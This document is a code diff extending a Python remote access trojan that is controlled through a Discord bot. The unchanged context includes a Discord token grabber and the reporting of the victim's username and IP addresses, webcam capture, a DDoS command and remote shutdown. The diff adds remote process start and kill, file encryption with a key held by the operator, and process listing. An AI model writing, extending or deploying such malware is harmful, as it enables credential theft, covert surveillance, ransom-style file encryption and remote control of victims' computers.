@@ -1,5 +1,5 @@
-from trojan_functions import cam, rv, token_grabber, screen_shot
-import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser
+from trojan_functions import cam, rv, token_grabber, screen_shot, encrypt_decrypt
+import os, subprocess, getpass, datetime, platform, shutil, socket, time, random, webbrowser, signal
 try:
     import requests
     from discord_webhook import DiscordWebhook
@@ -27,9 +27,9 @@ except ModuleNotFoundError:
             elif (platform.system == "Linux"):
                 s = os.system("sudo apt install python3 -y")
                 if(s == 1):
-                    s = os.system("sudo pacman -S python3")
+                    s = os.system("sudo pacman -S python3 -y")
                     if(s == 1):
-                        os.system("sudo yum install python3")
+                        os.system("sudo yum install python3 -y")
                         exit()
                     else:
                         exit()
@@ -40,11 +40,22 @@ except ModuleNotFoundError:
             os.system("pip install discord")
             os.system("pip install opencv-python")
             os.system("pip install pytube")
+            os.system("pip install pyautogui")
     else:
         os.system("pip3 install requests")
         os.system("pip3 install discord")
         os.system("pip3 install opencv-python")
         os.system("pip3 install pytube")
+        os.system("pip3 install pyautogui")
+    if(platform.system() == "Linux"):
+        l = os.system("sudo apt-get install scrot -y")
+        if(l == 1):
+            r = os.system("sudo pacman -S scrot -y")
+            if(r == 1):
+                os.system("sudo yum install scrot -y")
+    os.system("cls||clear")
+    print("restart the script")
+    exit()
 
 #url
 
@@ -74,15 +85,21 @@ async def username(ctx):
 
 @client.command()
 async def info(ctx):
-    await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
+    try:
+        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\nDiscord Token: " + token_grabber.tok_grab() +"\n--------------------")
+    except:
+        await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())))
 
 @client.command()
 @commands.has_permissions(administrator=True)
 async def cam_snap(ctx):
-    cam.cam_snap()
-    await ctx.send(datetime.datetime.now())
-    await ctx.send(file=discord.File('photo.png'))
-    os.remove("photo.png")
+    try:
+        cam.cam_snap()
+        await ctx.send(datetime.datetime.now())
+        await ctx.send(file=discord.File('photo.png'))
+        os.remove("photo.png")
+    except:
+        await ctx.send("Error. camera not found")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -135,6 +152,57 @@ async def delete_file(ctx, filee):
 
 @client.command()
 @commands.has_permissions(administrator=True)
+async def start_process(ctx, process_name):
+    try:
+        if(platform.system() == "Windows"):
+            os.system("start " + process_name)
+        else:
+            os.system(process_name)
+        await ctx.send(datetime.datetime.now)
+        await ctx.send("Process started")
+    except:
+        await ctx.send("Failed starting process")
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def kill_process(ctx, process_name):
+    if(platform.system() == "Windows"):
+        status = os.system("taskkill /IM " + process_name + " /T /F")
+        await ctx.send("process killed")
+    else:
+        status = os.kill(process_name, signal.SIGTERM)
+        await ctx.send("process killed")
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def encrypt_file(ctx, filename):
+    test = encrypt_decrypt.encrypt_file(filename)
+    if(test == 1):
+        await ctx.send("Error. ")
+    else:
+        await ctx.send("File encrypted, remember the key -> " + str(test))
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def decrypt_file(ctx, filename, key):
+    test = encrypt_decrypt.decrypt_file(filename, key)
+    if(test == 1):
+        await ctx.send("Error. ")
+    elif (test == 0):
+        await ctx.send("File Decrypted")
+
+@client.command()
+@commands.has_permissions(administrator=True)
+async def tasklist(ctx):
+    if(platform.system() == "Windows"):
+        os.system("tasklist > tasks.txt")
+    else:
+        os.system("ps aux > tasks.txt")
+    await ctx.send(file=discord.File("tasks.txt"))
+    os.remove("tasks.txt")
+
+@client.command()
+@commands.has_permissions(administrator=True)
 async def remove_dir(ctx, dirr):
     try:
         os.rmdir(dirr)
@@ -154,7 +222,7 @@ async def power_off(ctx):
     if(platform.system == "Windows"):
         os.system("shutdown /s /t 00")
     else:
-        os.system("shutdown /r now")
+        os.system("shutdown -r now")
 
 @client.command()
 @commands.has_permissions(administrator=True)
@@ -296,11 +364,10 @@ async def ddos(ctx, ip, port, tm, dl):
 @client.command()
 @commands.has_permissions(administrator=True)
 async def commands(ctx):
-    filecontent = open("commands.txt", "r").read()
-    await ctx.send(filecontent)
+    await ctx.send(file=discord.File("commands.txt"))
 
 client.run(discord_bot_token)
 
 DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
 
-os.system("cls")
+os.system("cls||clear")
